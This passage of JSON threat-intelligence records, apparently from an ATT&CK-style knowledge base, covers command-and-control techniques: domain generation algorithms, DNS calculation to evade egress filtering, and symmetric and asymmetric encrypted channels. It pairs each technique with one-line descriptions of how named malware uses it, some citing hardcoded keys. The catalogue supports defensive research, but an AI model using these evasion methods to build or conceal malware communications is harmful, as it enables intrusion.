"menuPass has used dynamic DNS service providers to host malicious domains."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has used a fast flux DNS for C2 IP resolution."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs."}]}, {"name": "Domain Generation Algorithms", "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.", "detailed_description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\nDGAs can take the form of apparently random or \"gibberish\" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.", "id": "T1568.002", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has used DGAs to change their C2 servers monthly."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to use a DGA for C2 communications."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth has used a DGA in C2 communications."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can implement DGA using the current date as a seed variable."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER uses a DGA to communicate with command and control servers."}, {"id": "S0222", "name": "CCBkdr", "description": "CCBkdr can use a DGA for Fallback Channels if communications with the primary command and control server are lost."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK can use a DGA for Fallback Channels, domains are generated by concatenating words from lists."}, {"id": "S0608", "name": "Conficker", "description": "Conficker has used a DGA that seeds with the current UTC victim system date to generate domains."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has used a DGA to generate a domain name for C2."}, {"id": "S0600", "name": "Doki", "description": "Doki has used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has used a DGA to generate a domain name for C2."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can use a DGA for hiding C2 addresses, including use of an algorithm with a user-specific key that changes daily."}, {"id": "S1015", "name": "Milan", "description": "Milan can use hardcoded domains as an input for domain generation algorithms."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke can use DGA to generate new Twitter URLs for C2."}, {"id": "S0508", "name": "ngrok", "description": "ngrok can provide DGA for C2 servers through the use of random URL strings that change every 12 hours."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY uses a DGA to derive command and control URLs from a word list."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use domain generation algorithms in C2 communication."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad uses a DGA that is based on the day of the month for C2 servers."}, {"id": "S1019", "name": "Shark", "description": "Shark can send DNS C2 communications using a unique domain generation algorithm."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can use a custom DGA to generate a subdomain for C2."}, {"id": "G0127", "name": "TA551", "description": "TA551 has used a DGA to generate URLs from executed macros."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used a DGA to generate domain names for C2."}]}, {"name": "DNS Calculation", "description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.", "detailed_description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.\nOne implementation of DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.", "id": "T1568.003", "examples": [{"id": "G0005", "name": "APT12", "description": "APT12 has used multiple variants of DNS Calculation including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port."}]}]}, {"name": "Encrypted Channel", "description": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "detailed_description": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.", "id": "T1573", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 has used multiple layers of encryption within malware to protect C2 communication."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has encrypted their C2 communications."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used encryption for its C2 channel."}, {"id": "S0498", "name": "Cryptoistic", "description": "Cryptoistic can engage in encrypted communications with C2."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has encrypted data before sending to the C2 server."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has encrypted TCP communications to evade detection."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity command and control activity includes transmission of an RSA public key in communication from the server, but this is followed by subsequent negotiation stages that represent a form of handshake similar to TLS negotiation."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can support encrypted communications between the client and server."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has used TLS encryption to initialize a custom protocol for C2 communications."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used an encrypted http proxy in C2 communications."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can encrypt C2 communications."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess can use an encrypted channel for C2 communications."}, {"id": "S1046", "name": "PowGoop", "description": "PowGoop can receive encrypted commands from C2."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can use an encrypted beacon to check in with C2."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles used cryptcat binaries to encrypt their traffic."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has encrypted traffic with the C2 to prevent network detection."}], "sub_techniques": [{"name": "Symmetric Cryptography", "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.", "detailed_description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.", "id": "T1573.001", "examples": [{"id": "S0066", "name": "3PARA RAT", "description": "3PARA RAT command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS. 3PARA RAT will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails"}, {"id": "S0065", "name": "4H RAT", "description": "4H RAT obfuscates C2 communication using a 1-byte XOR with the key 0xBE."}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "A variant of ADVSTORESHELL encrypts some C2 with 3DES."}, {"id": "G0007", "name": "APT28", "description": "APT28 installed a Delphi backdoor that used a custom algorithm for C2 communications."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used AES for encryption of command and control traffic."}, {"id": "S0438", "name": "Attor", "description": "Attor has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can encrypt C2 traffic using XOR."}, {"id": "S0245", "name": "BADCALL", "description": "BADCALL encrypts C2 traffic using an XOR/ADD cipher."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS encrypts C2 data with a ROR by 3 and an XOR by 0x23."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has used AES encryption for C2 communication."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can send C2 communications with XOR encryption."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT uses a custom encryption algorithm on data sent back to the C2 server over HTTP."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some Bisonal samples encrypt C2 communications with RC4."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has encrypted its C2 traffic with RC4."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan can XOR-encrypt C2 communications."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can encrypt C2 requests and responses with RC4"}, {"id": "S0077", "name": "CallMe", "description": "CallMe uses AES to encrypt C2 traffic."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak encrypts the message body of HTTP traffic with RC2 (in CBC mode). Carbanak also uses XOR with random keys for its communications."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT uses a secret key with a series of XOR and addition operations to encrypt C2 traffic."}, {"id": "S0220", "name": "Chaos", "description": "Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can send additional modules over C2 encrypted with a simple substitution cipher."}, {"id": "S0144", "name": "ChChes", "description": "ChChes can encrypt C2 traffic with AES or RC4."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK encrypts C2 communications with RC4."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data."}, {"id": "S0244", "name": "Comnie", "description": "Comnie encrypts command and control communications with RC4."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke contains a custom version of the RC4 algorithm that includes a programming error."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used AES-256 and 3DES for C2 communications."}, {"id": "S0187", "name": "Daserf", "description": "Daserf uses RC4 encryption to obfuscate HTTP traffic."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi obfuscates C2 traffic with variable 4-byte XOR keys."}, {"id": "S0200", "name": "Dipsind", "description": "Dipsind encrypts C2 data with AES256 in ECB mode."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to AES encrypt C2 communications."}, {"id": "S0134", "name": "Downdelph", "description": "Downdelph uses RC4 to encrypt C2 responses."}, {"id": "S0384", "name": "Dridex", "description": "Dridex has encrypted traffic with RC4."}, {"id": "S0038", "name": "Duqu", "description": "The Duqu command and control protocol's data stream can be encrypted with AES-CBC."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string."}, {"id": "S0081", "name": "Elise", "description": "Elise encrypts exfiltrated data with RC4."}, {"id": "S0082", "name": "Emissary", "description": "The C2 server response to a beacon sent by a variant of Emissary contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of Emissary use various XOR operations to encrypt C2 data."}, {"id": "S0367", "name": "Emotet", "description": "Emotet is known to use RSA keys for encrypting C2 traffic. "}, {"id": "S0091", "name": "Epic", "description": "Epic encrypts commands from the C2 server using a hardcoded key."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has encrypted communications with the RC4 method."}, {"id": "S0076", "name": "FakeM", "description": "The original variant of FakeM encrypts C2 traffic using a custom encryption cipher that uses an XOR key of \"YHCRA\" and bit rotation between each XOR operation. Some variants of FakeM use RC4 to encrypt C2 traffic."}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL encrypts C2 data with RC4 encryption."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can AES encrypt C2 communications."}, {"id": "S0171", "name": "Felismus", "description": "Some Felismus samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has used SEAL encryption during the initial C2 handshake."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb has used a dynamic XOR key and custom XOR methodology for C2 communications."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors communicated with C2 via an encrypted RC4 byte stream and AES-CBC."}, {"id": "S1144", "name": "FRP", "description": "FRP can use STCP (Secret TCP) with a preshared key to encrypt services exposed to public networks."}, {"id": "S0168", "name": "Gazer", "description": "Gazer uses custom encryption for C2 that uses 3DES."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT uses RC4 and XOR to encrypt C2 traffic."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy encrypts communications using AES256."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can use an AES key to encrypt C2 communications."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 encrypts C2 traffic using an RC4 key."}, {"id": "S0037", "name": "HAMMERTOSS", "description": "Before being appended to image files, HAMMERTOSS commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command."}, {"id": "S0170", "name": "Helminth", "description": "Helminth encrypts data sent to its C2 server over HTTP with RC4."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor encrypts C2 traffic with a double XOR using two distinct single-byte keys."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa used AES-128 to encrypt C2 traffic."}, {"id": "S0009", "name": "Hikit", "description": "Hikit performs XOR encryption."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has compressed network communications and encrypted them with a custom stream cipher."}, {"id": "S0068", "name": "httpclient", "description": "httpclient encrypts C2 content with XOR using a single byte, 0x12."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq C2 traffic is encrypted using bitwise NOT and XOR operations."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack has used RSA encryption for C2 communications."}, {"id": "S1022", "name": "IceApple", "description": "The IceApple Result Retriever module can AES encrypt C2 responses."}, {"id": "G0100", "name": "Inception", "description": "Inception has encrypted network communications with AES."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole uses variations of a simple XOR encryption routine for C&C communications."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE uses a customized XOR algorithm to encrypt C2 communications."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos's post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic."}, {"id": "S0162", "name": "Komplex", "description": "The Komplex C2 channel uses an 11-byte XOR algorithm to hide data."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used AES to encrypt C2 traffic."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can send RC4 encrypted data over C2 channels."}, {"id": "G0032", "name": "Lazarus Group", "description": "Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads. Lazarus Group has also used AES to encrypt C2 traffic."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron uses AES to encrypt C2 traffic."}, {"id": "S1119", "name": "LIGHTWIRE", "description": "LIGHTWIRE can RC4 encrypt C2 commands."}, {"id": "S0582", "name": "LookBack", "description": "LookBack uses a modified version of RC4 for data transfer."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can send AES encrypted C2 commands."}, {"id": "S0010", "name": "Lurid", "description": "Lurid performs XOR encryption."}, {"id": "S0409", "name": "Machete", "description": "Machete has used AES to exfiltrate documents."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can encrypt its C2 traffic with RC4."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can encrypt the data that it sends and receives from the C2 server using an RC4 encryption algorithm."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has encrypted C2 commands with AES-256."}, {"id": "S1026", "name": "Mongall", "description": "Mongall has the ability to RC4 encrypt C2 communications."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind encrypts C2 traffic using RC4 with a static key."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs has used an RC4-based encryption method for its C2 communications."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used AES to encrypt C2 responses."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has encrypted C2 communications with RC4."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore uses DES to encrypt the C2 traffic."}, {"id": "S0272", "name": "NDiskMonitor", "description": "NDiskMonitor uses AES to encrypt certain information sent over its C2 channel."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can use RC4 and XOR to encrypt C2 communications."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE will decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\""}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use AES encryption for C2 data transferred."}, {"id": "S1106", "name": "NGLite", "description": "NGLite will use an AES encrypted channel for command and control purposes, in one case using the key WHATswrongwithUu."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can XOR and AES encrypt C2 messages."}, {"id": "S0439", "name": "Okrum", "description": "Okrum uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase. "}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "OSX_OCEANLOTUS.D encrypts data sent back to the C2 using AES in CBC mode with a null initialization vector (IV) and a key sent from the server that is padded to 32 bytes."}, {"id": "S0664", "name": "Pandora", "description": "Pandora has the ability to encrypt communications with D3DES."}, {"id": "S1145", "name": "Pikabot", "description": "Earlier Pikabot variants use a custom encryption procedure leveraging multiple mechanisms including AES with multiple rounds of Base64 encoding for its command and control communication. Later Pikabot variants eliminate the use of AES and instead use RC4 encryption for transmitted information."}, {"id": "S1031", "name": "PingPull", "description": "PingPull can use AES, in cipher block chaining (CBC) mode padded with PKCS5, to encrypt C2 server communications."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon communications are RC4 encrypted."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE encodes C2 beacons using XOR."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has used RC4 encryption to download modules."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can use RC4 encryption in C2 communications."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy uses the Camellia cipher to encrypt communications."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON has used AES for encrypting C2 traffic."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka encrypts some C2 traffic with the Blowfish cipher."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can RC4 encrypt strings in C2 communication."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT uses AES with a hardcoded pre-shared key to encrypt network communication."}, {"id": "S1076", "name": "QUIETCANARY", "description": "QUIETCANARY can RC4 encrypt C2 communications."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use RC4 to encrypt C2 communications."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has used AES ciphertext to encode C2 communications."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used AES-128 CBC to encrypt C2 communications."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has encrypted command and control (C2) communications with a stream cipher."}, {"id": "S0003", "name": "RIPTIDE", "description": "APT12 has used the RIPTIDE RAT, which communicates over HTTP with a payload encrypted with RC4."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro encrypts C2 communication using a combination of AES, XOR, ROTATE encryption, and ZLIB compression."}, {"id": "S0148", "name": "RTM", "description": "RTM encrypts C2 traffic with a custom RC4 variant."}, {"id": "S0074", "name": "Sakula", "description": "Sakula encodes C2 traffic with single-byte XOR keys."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can encrypt C2 communications with AES."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to use an RC4 key to encrypt communications to and from actor-controlled C2 servers."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke C2 traffic has been encrypted with RC4 and AES."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist can encrypt C2 communications with a randomly generated key."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE can RC4 encrypt all incoming and outgoing C2 messages."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can use AES-GCM-256 to encrypt a session key for C2 message exchange."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has encrypted its C2 traffic with RC4."}, {"id": "S0159", "name": "SNUGRIDE", "description": "SNUGRIDE encrypts C2 traffic using AES with a static key."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can use RC4 to encrypt C2 communications."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has encrypted its C2 communications with AES."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can encrypt C2 traffic using XOR with a hard coded key."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key. Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST encrypted C2 traffic using a single-byte-XOR cipher."}, {"id": "S0060", "name": "Sys10", "description": "Sys10 uses an XOR 0x1 loop to encrypt its C2 domain."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has used DES to encrypt all C2 communications."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor uses RC4 to encrypt the message body of HTTP content."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption."}, {"id": "S0678", "name": "Torisma", "description": "Torisma has encrypted its C2 communications using XOR and VEST-32."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses a custom crypter leveraging Microsoft\u2019s CryptoAPI to encrypt C2 traffic.Newer versions of TrickBot have been known to use bcrypt to encrypt and digitally sign responses to their C2 server. "}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has encrypted network communications with RC4."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT encrypts instructions in its C2 network payloads using a simple XOR cipher."}, {"id": "S0275", "name": "UPPERCUT", "description": "Some versions of UPPERCUT have used the hard-coded string \"this is the encrypt key\" for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can encrypt the data beneath its http2 or tcp encryption at the session layer with CAST-128, using a different key for incoming and outgoing data."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer uses a simple XOR cipher to encrypt traffic and files."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can encrypt its C2 with RC4 with the password warzone160\\x00."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key."}, {"id": "S0430", "name": "Winnti for Linux", "description": "Winnti for Linux has used a custom TCP protocol with four-byte XOR for command and control (C2)."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can XOR encrypt C2 traffic."}, {"id": "S1115", "name": "WIREFIRE", "description": "WIREFIRE can AES encrypt process output sent from compromised devices to C2."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can use AES-CBC to encrypt data sent to its C2 server."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has encrypted data sent to the C2 server using a XOR key."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses RC4 encryption over TCP to communicate with its C2 server."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has used RC4 to encrypt C2 traffic."}, {"id": "S1114", "name": "ZIPLINE", "description": "ZIPLINE can use AES-128-CBC to encrypt data for both upload and download."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used AES encrypted communications in C2."}]}, {"name": "Asymmetric Cryptography", "description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.", "detailed_description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.", "id": "T1573.002", "examples": [{"id": "S0202", "name": "adbupd", "description": "adbupd contains a copy of the OpenSSL library to encrypt C2 traffic."}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "A variant of ADVSTORESHELL encrypts some C2 with RSA."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used HTTPS for command and control."}, {"id": "S0438", "name": "Attor", "description": "Attor's Blowfish key is encrypted with a public RSA key."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can beacon to a hardcoded C2 IP address using TLS encryption every 5 minutes."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can use TLS in C2 communications."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT uses SSL for encrypting C2 communications."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors used SSL via TCP port 443 for C2 communications."}, {"id": "S0335", "name": "Carbon", "description": "Carbon has used RSA encryption for C2 communications."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK encrypts C2 communications with TLS."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER connects to command and control infrastructure using SSL."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used the Plink utility to create SSH tunnels."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT can use SSL/TLS encryption for its HTTP-based C2 channel. ComRAT has used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel."}, {"id": "S1155", "name": "Covenant", "description": "Covenant can utilize SSL to encrypt command and control traffic."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink can encrypt C2 messages with AES-256-CBC sent underneath TLS. OpenSSL library functions are also used to encrypt each message using a randomly generated key and IV, which are then encrypted using a hard-coded RSA public key."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can use TLS to encrypt its C2 channel."}, {"id": "S0600", "name": "Doki", "description": "Doki has used the embedTLS library for network communications."}, {"id": "S0384", "name": "Dridex", "description": "Dridex has encrypted traffic with RSA."}, {"id": "S0363", "name": "Empire", "description": "Empire can use TLS to encrypt its C2 channel."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure."}, {"id": "S1144", "name": "FRP", "description": "FRP can be configured to only accept TLS connections."}, {"id": "S0168", "name": "Gazer", "description": "Gazer uses custom encryption for C2 that uses RSA."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax has RSA-encrypted its communication with the C2 server."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can use SSL in C2 communication."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy encrypts communications using RSA-2048."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can use a hardcoded server public RSA key to encrypt the first request to C2."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor encrypts C2 traffic with TLS."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used SSL and TLS in communications with C2."}, 